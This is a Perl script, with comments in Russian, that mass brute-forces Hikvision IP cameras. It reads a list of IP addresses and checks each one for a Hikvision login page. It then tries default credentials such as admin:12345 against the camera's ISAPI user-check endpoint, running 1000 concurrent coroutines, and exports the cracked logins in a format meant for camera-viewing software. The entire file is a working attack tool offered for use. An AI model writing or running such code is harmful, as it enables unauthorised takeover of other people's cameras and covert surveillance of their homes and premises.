#!/usr/bin/env perl

use utf8;
use strict;
use warnings;
use feature qw/say switch unicode_strings/;
use List::MoreUtils 'uniq';

use Coro;
use Coro::Select;
use LWP::UserAgent;

my $config = {
    input       => 'ip.txt',
    output_good => 'result.csv', # iVMS-4200 export file

    threads => 1000, # Количество потоков
};

# Массив авторизационных данных login:password
my @loginData = qw/
admin:12345
guest:guest
/;

# Список логинов
my @logins = qw/
/;

# Список паролей
my @passwords = qw/
/;

# Генерируем список логинов и паролей
for my $login (@logins) {
    for my $password (@passwords) {
        push @loginData, $login.':'.$password;
    }
}
@loginData = uniq @loginData;
say 'Generated combinations(login:password): '.scalar(@loginData);

# Читаем айпишники в массив
my @ipList;
open( INPUT, '<', $config->{input} ) or die "Can't open input file:".$config->{input}." [$!]";
chomp(@ipList = <INPUT>);
close(INPUT);
@ipList = uniq @ipList;
say 'IP list: '.scalar(@ipList);
say 'The total number of combinations of fingering: '.scalar(@ipList)*scalar(@loginData);

# Считаем время необходимое на выполнение брутфорса
my $timeALong = int(scalar(@ipList)*scalar(@loginData)*3/$config->{threads});
my $hours = int($timeALong/60/60);
my $minutes = int(($timeALong-($hours*60*60))/60);
my $seconds = $timeALong-(($hours*60*60)+($minutes*60));
say 'About the time of enumeration: ~ Hours:'.$hours.' Minutes:'.$minutes.' Seconds:'.$seconds;
say 'Press ENTER to continue.'; <STDIN>;

my @coros;
for ( 1 .. $config->{threads} ) {
    push @coros, async {
        my $ua = LWP::UserAgent->new;
		$ua->timeout(360);

		while (my $ip = shift(@ipList)) {
			chomp($ip);
			next unless ($ip);

			# Чекаем на наличие камеры
			unless (isItCamera($ip, $ua)) {
				say '[Not Camera] '.$ip;
				next;
			}
			say '[Camera] '.$ip;

			# Брутим
			for (@loginData) {
				my ($login, $password) = split(':', $_);

				if (login($ip, $login, $password, $ua)) {
					say '[Good Camera] '.$login.';'.$password.'@'.$ip;
					saveGood($ip, $login, $password);
					goto GOODnext;
				}
			}
			say '[Bad Camera] '.$ip;
			GOODnext:
        }
    };
}

$_->join for (@coros);

sub isItCamera {
    my ( $ip, $ua, $sign ) = @_;

    return 0 unless ( defined $ip or defined $ua );
    $sign = qr#Hikvision# unless ($sign);

    my $resp = $ua->get( 'http://' . $ip . '/doc/page/login.asp' );
    return 1 if ( ($resp->decoded_content||'') =~ $sign );
    return 0;
}

sub login {
    my ( $ip, $login, $password, $ua ) = @_;

    # Проверка данных
    return 0
        unless ( defined $ip
        or defined $login
        or defined $password
        or defined $ua );

    # Создаём пакет
    my $req = HTTP::Request->new(
		GET => 'http://'.$ip.'/ISAPI/Security/userCheck' );
    $req->authorization_basic( $login, $password );

    # Отправляем пакет
    my $resp = $ua->request($req);

    return 1 if ( $resp->content =~ m#<statusString>OK</statusString># );
    return 0;
}

sub saveGood {
	my ($ip, $login, $password) = @_;

	open( GOOD, '>>', $config->{output_good} )
        or die "Can't open output good file:".$config->{output_good}." [$!]";

	print GOOD '"PokPokPok","0","'.$ip.'","8000","0","'.$login.'","'.$password.'","0","0","0","0"'."\n";
	close(GOOD);
}
